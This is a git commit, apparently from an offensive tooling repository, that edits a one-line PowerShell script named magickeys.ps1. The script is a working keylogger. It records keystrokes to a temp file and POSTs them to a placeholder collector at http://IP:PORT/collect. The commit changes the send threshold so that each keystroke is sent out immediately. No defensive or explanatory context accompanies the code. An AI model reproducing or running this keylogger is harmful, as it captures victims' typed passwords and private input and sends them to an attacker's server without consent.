6a7223e19e8f54194ac477f4809a5b6cf9e32a78
azuk4r <102126589+azuk4r@users.noreply.github.com>
2024-09-20 00:26:48 +0200

    .Length -gt 1

--- examples/powershell/magickeys.ps1
+++ examples/powershell/magickeys.ps1
@@ -1,1 +1,1 @@
-$log="$env:temp\magickeys.txt";$uri="http://IP:PORT/collect";while($true){$key=[Console]::ReadKey().Key;$key|Out-File -Append -FilePath $log;if((Get-Item $log).Length -gt 500){$data=Get-Content -Path $log -Raw;Invoke-RestMethod -Uri $uri -Method Post -Body $data;Remove-Item $log}}
+$log="$env:temp\magickeys.txt";$uri="http://IP:PORT/collect";while($true){$key=[Console]::ReadKey().Key;$key|Out-File -Append -FilePath $log;if((Get-Item $log).Length -gt 1){$data=Get-Content -Path $log -Raw;Invoke-RestMethod -Uri $uri -Method Post -Body $data;Remove-Item $log}}
